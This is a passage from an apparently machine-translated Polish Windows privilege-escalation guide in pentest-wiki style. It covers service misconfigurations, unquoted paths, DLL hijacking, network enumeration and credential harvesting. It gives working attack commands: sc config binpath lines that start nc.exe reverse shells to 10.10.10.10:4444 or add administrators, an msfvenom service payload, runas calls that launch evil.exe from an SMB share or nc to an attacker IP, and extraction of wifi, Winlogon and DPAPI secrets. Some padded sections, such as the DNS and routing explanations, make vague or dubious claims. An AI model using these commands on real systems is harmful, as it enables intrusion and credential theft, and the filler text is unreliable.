Zawsze sprawdzaj, czy działają [**debuggery electron/cef/chromium**, można je wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów binarnych procesów (Hijacking DLL)**

Aby sprawdzić uprawnienia folderów binarnych procesów, możemy skorzystać z techniki Hijacking DLL.
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą narzędzia **procdump** z sysinternals. Usługi takie jak FTP mają **hasła w postaci tekstu jawnego w pamięci**, spróbuj wykonać zrzut pamięci i odczytać te dane uwierzytelniające.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niestabilne aplikacje z interfejsem graficznym

**Aplikacje działające jako SYSTEM mogą umożliwić użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Pomoc i obsługa techniczna systemu Windows" (Windows + F1), wyszukaj "wiersz polecenia", kliknij "Kliknij, aby otworzyć wiersz polecenia"

## Usługi

Pobierz listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć polecenia **sc**, aby uzyskać informacje o usłudze.
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarnego pliku **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzenie, czy "Użytkownicy uwierzytelnieni" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Możesz pobrać accesschk.exe dla systemu XP tutaj](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli masz taki błąd (na przykład z SSDPSRV):

_Błąd systemu 1058 wystąpił._\
_Usługa nie może zostać uruchomiona, ponieważ jest wyłączona lub nie ma skojarzonych z nią włączonych urządzeń._

Możesz ją włączyć, używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Należy wziąć pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki binarnej usługi**

W przypadku, gdy grupa "Authenticated users" posiada uprawnienia **SERVICE_ALL_ACCESS** do usługi, możliwa jest modyfikacja wykonywalnego pliku binarnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Uruchom ponownie usługę

Aby zrestartować usługę w systemie Windows, możesz użyć polecenia `sc` (Service Control Manager) lub narzędzia zarządzania usługami w Panelu sterowania. Oto kilka sposobów, jak to zrobić:

#### Za pomocą polecenia `sc`:

```plaintext
sc stop <nazwa_usługi>
sc start <nazwa_usługi>
```

Na przykład, jeśli chcesz zrestartować usługę o nazwie "MójSerwis", wykonaj następujące polecenia:

```plaintext
sc stop MójSerwis
sc start MójSerwis
```

#### Za pomocą narzędzia zarządzania usługami w Panelu sterowania:

1. Otwórz Panel sterowania.
2. Przejdź do sekcji "Administracyjne narzędzia".
3. Kliknij dwukrotnie na "Usługi".
4. Znajdź usługę, którą chcesz zrestartować.
5. Kliknij prawym przyciskiem myszy na usłudze i wybierz opcję "Restartuj".

Pamiętaj, że do restartu usługi wymagane mogą być uprawnienia administratora.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia mogą być eskalowane poprzez różne uprawnienia:
- **SERVICE_CHANGE_CONFIG**: Umożliwia ponowną konfigurację binarnej usługi.
- **WRITE_DAC**: Umożliwia ponowną konfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
- **WRITE_OWNER**: Umożliwia przejęcie własności i ponowną konfigurację uprawnień.
- **GENERIC_WRITE**: Dziedziczy możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Dziedziczy również możliwość zmiany konfiguracji usługi.

Do wykrywania i wykorzystania tej podatności można użyć _exploit/windows/local/service_permissions_.

### Słabe uprawnienia binarnych usług

**Sprawdź, czy możesz modyfikować binarny plik, który jest wykonywany przez usługę**, lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się ten plik ([**DLL Hijacking**](dll-hijacking.md))**.**
Możesz uzyskać dostęp do każdego binarnego pliku, który jest wykonywany przez usługę, używając **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz również użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia do modyfikacji rejestru usług

Powinieneś sprawdzić, czy możesz modyfikować dowolny rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** do rejestru usług, wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Użytkownicy uwierzytelnieni** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, można zmienić ścieżkę wykonywanego binarnego pliku.

Aby zmienić ścieżkę wykonywanego binarnego pliku:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Uprawnienia do dodawania danych/utworzenia podkatalogu w rejestrze usług

Jeśli masz te uprawnienia w rejestrze, oznacza to, że **możesz tworzyć podkatalogi z tego jednego**. W przypadku usług systemu Windows jest to **wystarczające do wykonania dowolnego kodu**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Niepoprawne ścieżki usług bez cudzysłowu

Jeśli ścieżka do pliku wykonywalnego nie jest umieszczona w cudzysłowach, system Windows spróbuje wykonać każdy fragment przed spacją.

Na przykład, dla ścieżki _C:\Program Files\Some Folder\Service.exe_ system Windows spróbuje wykonać:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
## Lista wszystkich niezacytowanych ścieżek usług, z wyłączeniem tych należących do wbudowanych usług systemu Windows:

Aby znaleźć niezacytowane ścieżki usług, które nie należą do wbudowanych usług systemu Windows, wykonaj następujące kroki:

1. Uruchom wiersz polecenia jako administrator.
2. Wpisz polecenie `wmic service get name,pathname,displayname,startmode | findstr /i "Auto" | findstr /v /i "C:\Windows\\" | findstr /v /i """` i naciśnij Enter.

Powyższe polecenie wyświetli listę wszystkich niezacytowanych ścieżek usług, które nie należą do wbudowanych usług systemu Windows.
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę podatność za pomocą narzędzia metasploit: `exploit/windows/local/trusted\_service\_path`
Możesz ręcznie utworzyć binarny plik usługi za pomocą narzędzia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Działania naprawcze

System Windows umożliwia użytkownikom określenie działań, które mają być podjęte w przypadku awarii usługi. Ta funkcja może być skonfigurowana tak, aby wskazywała na plik binarny. Jeśli ten plik binarny jest podatny na zastąpienie, możliwe jest eskalacja uprawnień. Więcej szczegółów można znaleźć w [oficjalnej dokumentacji](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia plików binarnych** (może można je nadpisać i uzyskać wyższe uprawnienia) oraz **folderów** ([Hijacking DLL](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować plik konfiguracyjny, aby odczytać pewien specjalny plik, lub czy możesz zmodyfikować pewny plik binarny, który zostanie wykonany przez konto Administratora (schedtasks).

Sposób na znalezienie słabych uprawnień folderów/plików w systemie polega na wykonaniu:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Uruchamianie przy starcie systemu

**Sprawdź, czy możesz nadpisać pewne klucze rejestru lub pliki binarne, które będą uruchamiane przez innego użytkownika.**\
**Przeczytaj** następującą **stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autostartu do eskalacji uprawnień**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Sterowniki

Sprawdź, czy istnieją **nieznane/narażone na podatności** zewnętrzne sterowniki.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Jeśli masz **uprawnienia do zapisu wewnątrz folderu obecnego w PATH**, możesz próbować przejąć kontrolę nad DLL załadowaną przez proces i **podnieść uprawnienia**.

Sprawdź uprawnienia wszystkich folderów w ścieżce PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Aby uzyskać więcej informacji na temat sposobu wykorzystania tej kontroli, zobacz:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### plik hosts

Sprawdź, czy w pliku hosts nie ma wpisanych innych znanych komputerów.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS

W systemie Windows istnieje wiele technik eskalacji uprawnień lokalnych, które można wykorzystać do uzyskania większych uprawnień niż te, które posiada standardowy użytkownik. Jedną z takich technik jest wykorzystanie słabych konfiguracji interfejsów sieciowych i DNS.

#### Konfiguracja interfejsów sieciowych

Podczas konfiguracji interfejsów sieciowych na systemie Windows, istnieje kilka czynników, które mogą prowadzić do potencjalnych luk w zabezpieczeniach:

- **Adresy IP**: Czasami administratorzy konfigurują interfejsy sieciowe z nieprawidłowymi adresami IP lub nieprawidłowymi maskami podsieci, co może prowadzić do nieoczekiwanych konsekwencji. Można to wykorzystać do eskalacji uprawnień.

- **Bramki domyślne**: Nieprawidłowo skonfigurowane bramki domyślne mogą prowadzić do przekierowania ruchu sieciowego na niezaufane adresy IP. To z kolei może umożliwić atakującemu przechwycenie ruchu sieciowego i wykorzystanie go do eskalacji uprawnień.

- **Protokoły sieciowe**: Niektóre protokoły sieciowe, takie jak NetBIOS, mogą być podatne na ataki i wykorzystywane do eskalacji uprawnień. Jeśli te protokoły są włączone na interfejsach sieciowych, atakujący może wykorzystać ich słabe konfiguracje do uzyskania większych uprawnień.

#### Konfiguracja DNS

Konfiguracja DNS na systemie Windows również może prowadzić do potencjalnych luk w zabezpieczeniach:

- **Podatne serwery DNS**: Jeśli serwery DNS są źle skonfigurowane lub nieaktualne, atakujący może wykorzystać te podatności do przekierowania ruchu sieciowego na kontrolowane przez siebie serwery DNS. To z kolei umożliwi mu przechwycenie ruchu sieciowego i wykorzystanie go do eskalacji uprawnień.

- **Podatne rekordy DNS**: Nieprawidłowo skonfigurowane rekordy DNS mogą prowadzić do przekierowania ruchu sieciowego na niezaufane adresy IP. Atakujący może wykorzystać te rekordy do przechwycenia ruchu sieciowego i wykorzystania go do eskalacji uprawnień.

W celu zabezpieczenia systemu przed eskalacją uprawnień poprzez słabe konfiguracje interfejsów sieciowych i DNS, zaleca się regularne przeglądanie i aktualizację tych konfiguracji. Administracja siecią i monitorowanie ruchu sieciowego są również kluczowe dla wykrywania i zapobiegania potencjalnym atakom.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Otwarte porty

Sprawdź **ograniczone usługi** z zewnątrz
```bash
netstat -ano #Opened ports?
```
### Tabela routingu

Tabela routingu to lista wpisów zawierających informacje o trasach sieciowych w systemie operacyjnym. Każdy wpis składa się z adresu sieciowego, maski podsieci, bramy domyślnej i interfejsu sieciowego. Tabela routingu jest wykorzystywana przez system operacyjny do określania, jakie pakiety mają być przekazywane do odpowiednich bram domyślnych w celu osiągnięcia docelowych adresów sieciowych.

W przypadku eskalacji uprawnień lokalnych w systemie Windows, tabela routingu może być przydatna, ponieważ może zawierać informacje o trasach sieciowych, które mogą być wykorzystane do uzyskania dostępu do innych sieci lub urządzeń w sieci lokalnej. Przeanalizowanie tabeli routingu może pomóc w identyfikacji potencjalnych celów i ścieżek ataku.

Aby wyświetlić tabelę routingu w systemie Windows, można użyć polecenia `route print` w wierszu poleceń. Polecenie to wyświetli wszystkie wpisy w tabeli routingu, wraz z informacjami o adresach sieciowych, maskach podsieci, bramach domyślnych i interfejsach sieciowych.

Przykładowe wyjście polecenia `route print` może wyglądać następująco:

```
===========================================================================
Lista interfejsów
  1...Loopback Pseudo-Interface 1
  2...Ethernet adapter Ethernet
  3...Wireless adapter Wi-Fi

===========================================================================
Tabela routingu
===========================================================================
Aktywne trasy:
Miejsce docelowe        Maska podsieci      Brama domyślna       Interfejs Metryka
          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.100     25
       127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
       127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.1.0    255.255.255.0         On-link     192.168.1.100    281
   192.168.1.100  255.255.255.255         On-link     192.168.1.100    281
   192.168.1.255  255.255.255.255         On-link     192.168.1.100    281
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link     192.168.1.100    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link     192.168.1.100    281
===========================================================================
```

W powyższym przykładzie można zauważyć kilka wpisów w tabeli routingu. Na przykład, wpis `0.0.0.0` z maską `0.0.0.0` i bramą domyślną `192.168.1.1` wskazuje, że wszystkie pakiety, które nie pasują do żadnej innej trasy, powinny być przekazywane do bramy domyślnej `192.168.1.1` przez interfejs `192.168.1.100`.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP

Tabela ARP (Address Resolution Protocol) zawiera informacje o mapowaniu adresów IP na adresy MAC w lokalnej sieci. Jest to istotne narzędzie w celu ustalenia, które urządzenia są obecne w sieci i jakie adresy IP są przypisane do tych urządzeń. Tabela ARP jest przechowywana w pamięci podręcznej systemu operacyjnego i jest automatycznie aktualizowana w miarę potrzeby.

Aby wyświetlić zawartość tabeli ARP w systemie Windows, można użyć polecenia `arp -a` w wierszu poleceń. Spowoduje to wyświetlenie listy adresów IP i odpowiadających im adresów MAC dla wszystkich urządzeń w sieci lokalnej.

Przykładowy wynik polecenia `arp -a` może wyglądać następująco:

```
Interfejs: 192.168.1.1 --- 0x2
  Adres internetowy       Adres fizyczny        Typ
  192.168.1.2             00-11-22-33-44-55     dynamiczne
  192.168.1.3             00-aa-bb-cc-dd-ee     dynamiczne
```

W powyższym przykładzie widać dwie wpisy w tabeli ARP. Pierwszy wpis pokazuje, że adres IP 192.168.1.2 jest mapowany na adres MAC 00-11-22-33-44-55, a drugi wpis pokazuje, że adres IP 192.168.1.3 jest mapowany na adres MAC 00-aa-bb-cc-dd-ee.

Tabela ARP może być przydatna podczas analizy sieciowej i identyfikacji urządzeń w sieci.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Zasady zapory sieciowej

[**Sprawdź tę stronę dla poleceń związanych z zaporą sieciową**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie zasad, tworzenie zasad, wyłączanie, włączanie...)**

Więcej [poleceń do wyliczania sieciowego tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem dla Linuxa (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia root, możesz nasłuchiwać na dowolnym porcie (po pierwszym użyciu `nc.exe` do nasłuchiwania na porcie, zostanie wyświetlone okno dialogowe z pytaniem, czy `nc` powinno być zezwolone przez zaporę ogniową).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia systemu Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Skarbiec systemu Windows

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Skarbiec systemu Windows przechowuje poświadczenia użytkowników dla serwerów, stron internetowych i innych programów, które **system Windows może automatycznie zalogować** użytkowników. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać w nim swoje poświadczenia do Facebooka, Twittera, Gmaila itp., aby automatycznie logować się za pomocą przeglądarek. Ale tak nie jest.

Skarbiec systemu Windows przechowuje poświadczenia, które system Windows może automatycznie używać do logowania użytkowników, co oznacza, że **dowolna aplikacja systemu Windows, która potrzebuje poświadczeń do dostępu do zasobu** (serwera lub strony internetowej) **może korzystać z Menedżera poświadczeń i Skarbca systemu Windows** i używać dostarczonych poświadczeń zamiast tego, aby użytkownicy musieli wpisywać nazwę użytkownika i hasło za każdym razem.

Chyba że aplikacje współpracują z Menedżerem poświadczeń, nie sądzę, żeby mogły korzystać z poświadczeń dla danego zasobu. Więc jeśli twoja aplikacja chce skorzystać ze skarbca, powinna w jakiś sposób **komunikować się z menedżerem poświadczeń i żądać poświadczeń dla tego zasobu** z domyślnego skarbca przechowywania.

Użyj polecenia `cmdkey`, aby wyświetlić przechowywane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć polecenia `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik binarny za pośrednictwem udziału SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Używanie polecenia `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Zauważ, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) lub z [modułu Powershella Empire](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** zapewnia metodę symetrycznego szyfrowania danych, głównie używaną w systemie operacyjnym Windows do symetrycznego szyfrowania kluczy asymetrycznych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, aby znacząco przyczynić się do entropii.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego, który jest pochodną tajemnicy logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje tajemnice uwierzytelniania domeny systemu.

Zaszyfrowane klucze RSA użytkownika, za pomocą DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` reprezentuje [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security\_Identifier) użytkownika. **Klucz DPAPI, współlokowany z kluczem głównym, który chroni prywatne klucze użytkownika w tym samym pliku**, zazwyczaj składa się z 64 bajtów losowych danych. (Warto zauważyć, że dostęp do tego katalogu jest ograniczony, co uniemożliwia wyświetlanie jego zawartości za pomocą polecenia `dir` w CMD, chociaż można je wyświetlić za pomocą PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć modułu **mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`) do jego odszyfrowania.

Pliki **zabezpieczone hasłem głównym** są zazwyczaj przechowywane w:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć modułu **mimikatz** `dpapi::cred` z odpowiednim `/masterkey` do odszyfrowania.\
Możesz **wydobyć wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia roota).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptowania** i automatyzacji zadań jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione za pomocą **DPAPI**, co zazwyczaj oznacza, że mogą być odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PS z pliku zawierającego je, możesz użyć:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

Wifi to technologia bezprzewodowej komunikacji, która umożliwia urządzeniom bezprzewodowym łączenie się z siecią internetową. Jest szeroko stosowana w domach, biurach, kawiarniach i innych miejscach publicznych. Aby korzystać z wifi, urządzenie musi być wyposażone w odpowiednią kartę sieciową i mieć dostęp do sieci wifi. W celu zabezpieczenia sieci wifi przed nieautoryzowanym dostępem, można zastosować różne metody, takie jak użycie hasła, filtrowanie adresów MAC i konfiguracja sieci w trybie ukrytym. Jednakże, istnieją również różne techniki hakowania wifi, które mogą być wykorzystane do nieautoryzowanego dostępu do sieci wifi.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Możesz je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchomione polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**

---

#### **Opis**

Menedżer poświadczeń pulpitu zdalnego jest narzędziem wbudowanym w system Windows, które przechowuje poświadczenia używane do logowania się na zdalne pulpity. Może to obejmować nazwy użytkowników i hasła, a także certyfikaty SSL. Menedżer poświadczeń pulpitu zdalnego jest chroniony przez system operacyjny i dostęp do niego jest kontrolowany przez uprawnienia użytkownika.

#### **Potencjalne zagrożenie**

Jeśli atakujący uzyska dostęp do Menedżera poświadczeń pulpitu zdalnego, może wykradnąć przechowywane tam poświadczenia i uzyskać nieuprawniony dostęp do zdalnych pulpitów.

#### **Technika eskalacji uprawnień**

Aby wykorzystać Menedżer poświadczeń pulpitu zdalnego do eskalacji uprawnień, atakujący musi najpierw uzyskać dostęp do konta użytkownika z uprawnieniami administratora. Następnie może użyć narzędzi takich jak `cmdkey` lub `VaultCmd.exe` do wyświetlenia lub wykradnięcia przechowywanych poświadczeń.

#### **Zapobieganie**

Aby zabezpieczyć Menedżer poświadczeń pulpitu zdalnego przed atakami eskalacji uprawnień, zaleca się:

- Używanie silnych haseł dla kont administratora.
- Ograniczenie dostępu do konta administratora tylko do niezbędnych użytkowników.
- Regularne monitorowanie i audytowanie Menedżera poświadczeń pulpitu zdalnego w celu wykrycia nieautoryzowanego dostępu.
